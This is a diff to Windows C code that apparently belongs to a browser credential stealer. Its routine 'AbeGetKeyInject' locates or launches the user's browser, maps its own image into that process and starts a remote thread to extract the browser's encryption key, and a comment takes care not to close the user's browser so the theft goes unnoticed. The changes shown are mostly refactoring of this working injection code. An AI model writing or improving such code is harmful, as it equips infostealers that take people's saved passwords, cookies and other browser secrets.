@@ -23,7 +23,10 @@ AbeFindProcessIdByName(
             Pid = (ULONG)(ULONG_PTR)Entry->UniqueProcessId;
             break;
         }
-        if (Entry->NextEntryOffset == 0) break;
+        if (Entry->NextEntryOffset == 0)
+        {
+            break;
+        }
         Entry = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)Entry + Entry->NextEntryOffset);
     }
     Sys_FreeInfo(Info);
@@ -32,10 +35,10 @@ AbeFindProcessIdByName(
 
 /*** method: Inject (target the running browser process, launch it if needed) ***/
 
+_Success_(return)
 BOOL
 AbeGetKeyInject(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
 {
     PVOID Self = (PVOID)&__ImageBase;
@@ -46,30 +49,18 @@ AbeGetKeyInject(
     ULONG Pid, Polls;
     NTSTATUS Status;
 
-    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
+    if (!AbePrepareRequest(Browser))
+    {
+        return FALSE;
+    }
 
     Pid = AbeFindProcessIdByName(Browser->ExeName);
     if (Pid == 0)
     {
         /* not running: launch it so we have a live process to inject into */
-        STARTUPINFOW Si;
         PROCESS_INFORMATION Pi;
 
-        RtlZeroMemory(&Si, sizeof(Si));
-        RtlZeroMemory(&Pi, sizeof(Pi));
-        Si.cb = sizeof(Si);
-        if (!CreateProcessInternalW(NULL,
-                                    Browser->ExePath,
-                                    NULL,
-                                    NULL,
-                                    NULL,
-                                    FALSE,
-                                    0,
-                                    NULL,
-                                    NULL,
-                                    &Si,
-                                    &Pi,
-                                    NULL))
+        if (!AbeCreateBrowserProcess(Browser->ExePath, 0, &Pi))
         {
             AbeLog(L"Inject: failed to create browser process, gle=%lu\r\n", Err_GetLastError());
             return FALSE;
@@ -79,7 +70,10 @@ AbeGetKeyInject(
         for (Polls = 0; Polls < 50; Polls++)
         {
             Pid = AbeFindProcessIdByName(Browser->ExeName);
-            if (Pid != 0) break;
+            if (Pid != 0)
+            {
+                break;
+            }
             PS_DelayExec(200);
         }
         AbeLog(L"Inject: launched %ls (pid=%lu)\r\n", Browser->ExeName, Pid);
@@ -104,7 +98,7 @@ AbeGetKeyInject(
         NT_SUCCESS(PS_CreateThread(Process,
                                    FALSE,
                                    (PUSER_THREAD_START_ROUTINE)((PBYTE)Mapped +
-                                       ((ULONG64)(ULONG_PTR)AbeInjectEntry - (ULONG64)(ULONG_PTR)Self)),
+                                       ((ULONG_PTR)AbeInjectEntry - (ULONG_PTR)Self)),
                                    NULL,
                                    &Thread,
                                    NULL)))
@@ -117,8 +111,14 @@ AbeGetKeyInject(
     }
 
     /* do NOT terminate the user's browser; the remote thread exits on its own */
-    if (Thread != NULL) NtClose(Thread);
-    if (Mapped != NULL) NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
+    if (Thread != NULL)
+    {
+        NtClose(Thread);
+    }
+    if (Mapped != NULL)
+    {
+        NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
+    }
     NtClose(Process);
     return Code == 0;
 }
